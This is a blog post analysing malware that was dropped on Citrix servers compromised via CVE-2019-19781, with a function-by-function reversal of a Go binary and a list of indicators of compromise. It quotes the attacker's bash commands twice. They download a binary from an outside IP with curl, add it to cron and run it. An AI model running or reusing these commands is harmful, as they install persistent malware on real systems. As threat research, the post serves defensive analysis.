<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta name="google-site-verification" content="R8WxIY350MGoDTCcNxtiL2hERA_j2XihQ5ZZO7-DLNI" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Citrix CVE-2019-19781 malware analysis | HOME</title>
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Citrix CVE-2019-19781 malware analysis" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Please read the disclaimer" />
<meta property="og:description" content="Please read the disclaimer" />
<link rel="canonical" href="http://localhost:4000/2020/01/17/citrix_malware.html" />
<meta property="og:url" content="http://localhost:4000/2020/01/17/citrix_malware.html" />
<meta property="og:site_name" content="HOME" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-01-17T18:08:00+01:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Citrix CVE-2019-19781 malware analysis","url":"http://localhost:4000/2020/01/17/citrix_malware.html","datePublished":"2020-01-17T18:08:00+01:00","dateModified":"2020-01-17T18:08:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/01/17/citrix_malware.html"},"description":"Please read the disclaimer","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="HOME" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">HOME</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
              <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
              <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/contact/">Contact</a><a class="page-link" href="/quotes/">Quotes</a><a class="page-link" href="/resources/">Training resources</a><a class="page-link" href="/disclaimer/">Disclaimer</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Citrix CVE-2019-19781 malware analysis</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2020-01-17T18:08:00+01:00" itemprop="datePublished">Jan 17, 2020
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <h2 id="please-read-the-disclaimer">Please read the <a href="/disclaimer/">disclaimer</a></h2>

<p>After the exploit release of CVE-2019-19781, malicious hackers took the opportunity to compromise Citrix instances that did not have the Citrix mitigation implemented. I had the chance to get my hands on some artefacts from a honey pot of a certain threat actor who compromised multiple servers <a href="https://twitter.com/michel228/status/1216771783656910849">tweet link</a>, in this post I will talk in details on how I reversed it using Cutter.</p>

<p><strong>Note: the secret key used by the malware was altered by m.</strong></p>

<h2 id="post-exploitation">Post-exploitation:</h2>

<p>We notice that the threat actor executed the following bash commands on the compromised system:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="code"><pre><span class="nb">kill</span> <span class="nt">-9</span> netscalerd<span class="p">;</span> 
<span class="nb">rm</span> /var/tmp/netscalerd<span class="p">;</span> 
<span class="nb">mkdir</span> /tmp/.init<span class="p">;</span> 
curl <span class="nt">-k</span> https://95.179.163.186/wp-content/uploads/2018/09/6b37ab9644fff4d954615c93cc890039 <span class="nt">-o</span> /tmp/.init/httpd<span class="p">;</span> 
<span class="nb">chmod </span>744 /tmp/.init/httpd<span class="p">;</span> 
<span class="nb">echo</span> <span class="s2">"* * * * * /var/nstmp/.nscache/httpd"</span> | crontab -<span class="p">;</span> 
/tmp/.init/httpd &amp;<span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></figure>

<ol>
  <li>It kill all running instances of netscalerd</li>
  <li>It delete the file <strong>/var/tmp/netscalerd</strong></li>
  <li>It create the directory <strong>/tmp/.init</strong></li>
  <li>It download a binary file from 95.179.163.186 through https request and save it in <strong>/tmp/.init/httpd</strong></li>
  <li>It create a cronjob to run <strong>/var/nstmp/.nscache/httpd</strong>, note: this file is created by the downloaded binary.</li>
</ol>

<h2 id="overview-of-the-binary-file">Overview of the binary file:</h2>

<p>Opening the binary with Cutter reveals that it’s a golang compiled binary composed of multiple functions mainly:</p>

<ol>
  <li><strong>main</strong></li>
  <li><strong>install_itself</strong></li>
  <li><strong>remove_bds</strong></li>
  <li><strong>doFile</strong></li>
  <li><strong>install_cron</strong></li>
  <li><strong>xrun</strong></li>
  <li><strong>func1</strong></li>
</ol>

<h2 id="analyses">Analyses</h2>

<h3 id="main-function">main function:</h3>

<p>Run <a href="#remove_bds-function">remove_bds function</a> as a thread and check if the file <strong>/var/nstmp/.nscache/httpd</strong> , if it does not exist it run <a href="#install_itself-function">install_itself function</a>.</p>

<p><img src="/assets/img/citrix_malware/call_removedbs_install_itself.png" alt="call_removedbs_install_itself" /></p>

<p>if the current process CWD do not contain the string <strong>.nscache/httpd</strong> it start <strong>/var/nstmp/.nscache/httpd</strong> as new process then it exit, else it run 2 other threads:</p>

<ol>
  <li><a href="#xrun-function">xrun function</a></li>
  <li><a href="#install_cron-function">install_cron function</a></li>
</ol>

<p><img src="/assets/img/citrix_malware/xrun_thread_start_process.png" alt="xrun_thread_start_process" /></p>

<h3 id="install_itself-function">install_itself function:</h3>

<p>It create a directory <strong>/var/nstmp/.nscache</strong></p>

<p><img src="/assets/img/citrix_malware/install_itself_mkdir.png" alt="install_itself_mkdir" /></p>

<p>check if the file <strong>/var/nstmp/.nscache/httpd</strong> already exist</p>

<p><img src="/assets/img/citrix_malware/install_itself_check_file_exist.png" alt="install_itself_check_file_exist" /></p>

<p>if not, it copy it self to <strong>/var/nstmp/.nscache/httpd</strong></p>

<h3 id="remove_bds-function">remove_bds function:</h3>

<p>It continuously read the directory <strong>/netscaler/portal/scripts</strong></p>

<p><img src="/assets/img/citrix_malware/remove_dbs_readdir.png" alt="remove_dbs_readdir" /></p>

<p>then loops through all the files contained in that directory, by checking if they were created in the last <strong>14 days</strong></p>

<p><img src="/assets/img/citrix_malware/remove_bds_check_14_days.png" alt="remove_bds_check_14_days" /></p>

<p>if yes, it proceed to <a href="#dofile-function">doFile function</a></p>

<p><img src="/assets/img/citrix_malware/remove_dbs_dofile.png" alt="remove_dbs_dofile" /></p>

<h3 id="dofile-function">doFile function:</h3>

<p>It first check if the file name contains a special 32 bytes long string (secret key)</p>

<p><img src="/assets/img/citrix_malware/dofile_check_name.png" alt="dofile_check_name" /></p>

<p>In the case where it does not, it continue by checking if the content of the file contains the strings <strong>block</strong> or <strong>BLOCK</strong> if it does, the file will be deleted unless it also contains the <strong>secret key</strong>.</p>

<p><img src="/assets/img/citrix_malware/dofile_block_key_string.png" alt="dofile_block_key_string" /></p>

<h3 id="install_cron-function">install_cron function:</h3>

<p>Is for some reasons … empty.</p>

<p><img src="/assets/img/citrix_malware/install_cron.png" alt="install_cron" /></p>

<h3 id="xrun-function">xrun function:</h3>

<p>Start a UDP listener on <strong>*:18634</strong> then it keep listening on that port, without using the data received.</p>

<p><img src="/assets/img/citrix_malware/xrun_resolveudp.png" alt="xrun_resolveudp" /></p>

<h3 id="func1-function">func1 function:</h3>

<p>It continuously scan the directory <strong>/netscaler/portal/templates</strong> for <strong>*.xml</strong> files, then call <a href="#dofile-function">doFile function</a>.
In other words every xml file that contain the string <strong>block</strong> or <strong>BLOCK</strong> will be deleted unless the content/file name contain the <strong>secret key</strong>.</p>

<p><img src="/assets/img/citrix_malware/func1_delete_files_if_block_key.png" alt="func1_delete_files_if_block_key" /></p>

<h2 id="conclusion">Conclusion:</h2>

<p>From my understanding, the author’s goal was to stop other malicious hackers from exploiting and gaining access to the Citrix instance by deleting every uploaded xml file, while retaining access to himself, indeed with that 32 bytes long string which serves as a <strong>secret key</strong>, only the author of this malware can gain access to the compromised server.</p>

<h2 id="collected-iocs">Collected IOCs:</h2>

<ol>
  <li><strong>Filenames</strong>:
    <ul>
      <li>/tmp/.init/httpd</li>
      <li>/var/nstmp/.nscache/httpd</li>
    </ul>
  </li>
  <li><strong>Directories</strong>
    <ul>
      <li>/var/nstmp/.nscache</li>
      <li>/tmp/.init</li>
    </ul>
  </li>
  <li><strong>IPs</strong>
    <ul>
      <li>95.179.163.186</li>
    </ul>
  </li>
  <li><strong>UDP listener</strong>
    <ul>
      <li>*.18634</li>
    </ul>
  </li>
  <li><strong>Bash history</strong>
    <ul>
      <li>kill -9 netscalerd;</li>
      <li>rm /var/tmp/netscalerd;</li>
      <li>mkdir /tmp/.init;</li>
      <li>curl -k https://95.179.163.186/wp-content/uploads/2018/09/6b37ab9644fff4d954615c93cc890039 -o /tmp/.init/httpd;</li>
      <li>chmod 744 /tmp/.init/httpd;</li>
      <li>echo “* * * * * /var/nstmp/.nscache/httpd” | crontab -;</li>
      <li>/tmp/.init/httpd &amp;;</li>
    </ul>
  </li>
</ol>

  </div><a class="u-url" href="/2020/01/17/citrix_malware.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
        <ul class="contact-list">
          <li class="p-name"><ul class="social-media-list"><li><a href="https://github.com/soolidsnake"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">soolidsnake</span></a></li></ul>
</br>
          <li class="p-name">
            <p>All tasks and writeups are copyrighted by their author. All images and the logo are copyrighted by me. If you would like to use them, please contact me :)</p>
        </ul>
    </div>

  </div>

</footer>
</body>

</html>
